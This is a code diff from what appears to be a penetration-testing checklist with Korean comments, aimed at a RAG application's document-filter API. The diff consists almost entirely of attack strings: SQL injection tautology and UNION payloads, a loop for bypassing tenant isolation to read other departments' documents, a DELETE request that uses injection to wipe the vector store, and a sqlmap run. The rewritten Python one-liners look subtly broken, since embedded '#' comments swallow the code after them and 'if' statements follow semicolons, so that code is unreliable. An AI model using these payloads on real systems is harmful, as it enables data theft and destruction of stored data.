@@ -1357,21 +1357,41 @@ else:
             "-mc 200,403 -fs 0 2>/dev/null | grep -E 'docs|search|query|chat|ask'",
             "# 2) 메타데이터 필터 파라미터 확인",
             "curl -s 'https://TARGET/api/docs?department=HR' | python3 -m json.tool",
-            "# 3) SQL Injection 탐지 — 기본 페이로드 (bash+curl)",
-            "N=$(curl -sk -m 10 '${TARGET}/api/docs?department=HR' | python3 -c \"import json,sys; print(json.loads(sys.stdin.read()).get('count',0))\"); "
-            "I=$(curl -sk -m 10 \"${TARGET}/api/docs?department=%27+OR+%271%27%3D%271\" | python3 -c \"import json,sys; print(json.loads(sys.stdin.read()).get('count',0))\"); "
-            "echo \"Normal: ${N} docs, Injected: ${I} docs\"; "
-            "[ \"${I}\" -gt \"${N}\" ] && echo 'VULNERABLE: SQL Injection in vector store filter!'",
-            "# 4) 테넌트 격리 우회 (타 부서 문서 탈취, bash+curl)",
-            "for P in \"' OR '1'='1\" \"' OR department='Finance' OR '1'='0\" \"') OR (1=1)--\" \"' UNION SELECT content,metadata FROM vector_store--\"; do "
-            "  echo \"--- Payload: ${P}\"; "
-            "  curl -sk -m 10 \"${TARGET}/api/docs\" --data-urlencode \"department=${P}\" | python3 -c \"import sys; print(sys.stdin.read()[:200])\"; "
-            "done",
+            "# 3) SQL Injection 탐지 — 기본 페이로드",
+            "python3 -c \""
+            "import requests; "
+            "TARGET = 'https://TARGET'; "
+            "# 정상 요청"
+            "r1 = requests.get(f'{TARGET}/api/docs', params={'department': 'HR'}); "
+            "count_normal = r1.json().get('count', 0); "
+            "# SQLi 페이로드 (tautology)"
+            "r2 = requests.get(f'{TARGET}/api/docs', params={'department': \\\"' OR '1'='1\\\"}); "
+            "count_injected = r2.json().get('count', 0); "
+            "print(f'Normal: {count_normal} docs, Injected: {count_injected} docs'); "
+            "if count_injected > count_normal: "
+            "    print('VULNERABLE: SQL Injection in vector store filter!')\"",
+            "# 4) 테넌트 격리 우회 (타 부서 문서 탈취)",
+            "python3 -c \""
+            "import requests; "
+            "TARGET = 'https://TARGET'; "
+            "payloads = ["
+            "    \\\"' OR '1'='1\\\","
+            "    \\\"' OR department='Finance' OR '1'='0\\\","
+            "    \\\"') OR (1=1)--\\\","
+            "    \\\"' UNION SELECT content, metadata FROM vector_store--\\\","
+            "]; "
+            "[print(f'Payload: {p}\\nResponse: {requests.get(f\\\"{TARGET}/api/docs\\\", params={\\\"department\\\": p}).text[:200]}\\n') for p in payloads]\"",
             "# 5) DELETE를 통한 벡터 스토어 삭제 (DoS)",
             "curl -X DELETE 'https://TARGET/api/docs?department=%27+OR+%271%27%3D%271'",
-            "# 6) LangChain 패턴 점검 (로컬 코드 grep)",
-            "grep -nE 'metadata_filter|filter_|MariaDBVectorStore|PGVectorStore' app.py 2>/dev/null "
-            "| grep -q . && echo 'Vector filter or store found — check parameterization' || echo 'No vector filter pattern found'",
+            "# 6) LangChain 패턴 점검",
+            "python3 -c \""
+            "# LangChain vectorstore.as_retriever() metadata filter 확인"
+            "import re; "
+            "code = open('app.py').read() if __import__('os').path.exists('app.py') else ''; "
+            "if 'metadata_filter' in code or 'filter_' in code: "
+            "    print('Metadata filter detected — check for user input reaching filter'); "
+            "if 'MariaDBVectorStore' in code or 'PGVectorStore' in code: "
+            "    print('Vector store found — verify parameterization')\"",
             "# 7) sqlmap으로 자동화 (REST API 모드)",
             "sqlmap -u 'https://TARGET/api/docs?department=HR' -p department "
             "--dbms=mysql --level=3 --risk=2 --batch --output-dir=/tmp/sqlmap_rag",
